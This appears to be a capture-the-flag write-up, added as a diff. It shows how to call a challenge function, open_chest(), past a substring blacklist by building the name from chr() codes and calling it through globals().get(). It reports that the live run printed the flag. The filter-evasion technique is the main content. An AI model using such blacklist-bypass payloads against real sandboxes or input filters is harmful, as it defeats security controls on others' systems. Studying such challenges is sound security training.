@@ -1,0 +1,15 @@
+# Payload analysis
+
+Goal: call open_chest() without the literal substrings 'open', '[', ']', quotes.
+
+Build the function name from chr() codes (no literals, no quotes, no brackets):
+
+  chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116)
+  = o p e n _ c h e s t
+
+Access the global dict without '[' ']' using dict.get() (string key), then call:
+
+  globals().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()
+
+Checked: no blacklisted substring present -> blacklist passes.
+Local simulation executed open_chest() successfully; live run printed the flag.
